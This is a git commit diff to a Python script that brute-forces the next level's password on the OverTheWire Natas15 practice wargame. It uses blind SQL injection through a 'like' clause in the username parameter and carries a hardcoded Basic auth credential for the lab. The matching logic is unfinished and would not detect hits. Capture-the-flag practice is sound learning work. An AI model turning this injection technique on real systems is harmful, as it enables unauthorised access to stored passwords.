222667ea25148bb62af22a79f17b029a5c0cf52c
staticbunny <matt.griffiths@gmail.com>
2016-11-01 04:33:38 +0000

    added BeautifulSoup to parse out response

--- Natas15_Request.py
+++ Natas15_Request.py
@@ -1,9 +1,9 @@
 import requests,string
+from bs4 import BeautifulSoup
 password = ("wA")
 alphanum = string.ascii_letters + string.digits
 url = "http://natas15.natas.labs.overthewire.org/"
 #
-querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
 length = len(password)
 headers = {
     'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
@@ -13,8 +13,9 @@ headers = {
 for attempt in alphanum: 
      querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
      response = requests.request("GET", url, headers=headers, params=querystring)
-     print(response.text)
-  
-# if "This user exists." in response:
-#  string.append(password)
-
+     c = response.text
+     soup = BeautifulSoup(c, "html.parser")
+     samples = soup.find_all(id='content')
+     print(samples)
+     if "This user exists." in samples:
+      print(attempt)
